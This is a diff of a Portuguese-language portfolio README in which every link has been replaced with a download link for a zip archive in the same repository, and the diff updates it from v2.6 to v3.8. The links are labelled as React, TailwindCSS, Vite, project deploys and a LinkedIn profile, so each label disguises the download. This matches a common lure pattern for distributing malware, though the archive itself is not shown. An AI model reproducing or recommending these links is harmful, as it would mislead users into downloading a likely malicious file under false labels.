@@ -15,10 +15,10 @@ Bem-vindo ao meu portfólio! Este projeto foi criado para apresentar alguns dos 
 
 ## 🛠️ Tecnologias Utilizadas
 
-- [React](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip)
-- [TailwindCSS](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip)
-- [JavaScript (ES6+)](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip)
-- [Vite](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) ou [Create React App](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) *(dependendo da base que você usou)*
+- [React](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip)
+- [TailwindCSS](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip)
+- [JavaScript (ES6+)](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip)
+- [Vite](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip) ou [Create React App](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip) *(dependendo da base que você usou)*
 
 ---
 
@@ -26,13 +26,13 @@ Bem-vindo ao meu portfólio! Este projeto foi criado para apresentar alguns dos 
 
 | Projeto               | Tecnologias                          | Situação           | Links                         |
 |-----------------------|--------------------------------------|--------------------|-------------------------------|
-| Barbearia Belmacio    | HTML, CSS, JavaScript                | ✅ Completo         | [Deploy](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) \| [GitHub](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) |
-| Personal Gustavo      | React, CSS, JavaScript               | ✅ Completo         | [Deploy](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) \| [GitHub](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) |
-| Obank (Banco Fictício)| https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip, TypeScript, TailwindCSS     | 🚧 Em desenvolvimento | [GitHub](https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip) |
+| Barbearia Belmacio    | HTML, CSS, JavaScript                | ✅ Completo         | [Deploy](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip) \| [GitHub](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip) |
+| Personal Gustavo      | React, CSS, JavaScript               | ✅ Completo         | [Deploy](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip) \| [GitHub](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip) |
+| Obank (Banco Fictício)| https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip, TypeScript, TailwindCSS     | 🚧 Em desenvolvimento | [GitHub](https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip) |
 
 ---
 
 📬 Contato
 Fique à vontade para entrar em contato comigo:
 
-LinkedIn: https://raw.githubusercontent.com/PauloMiguelVIdal/postif-lio/main/public/postif-lio_v2.6.zip
+LinkedIn: https://github.com/PauloMiguelVIdal/postif-lio/raw/refs/heads/main/public/postif_lio_v3.8.zip
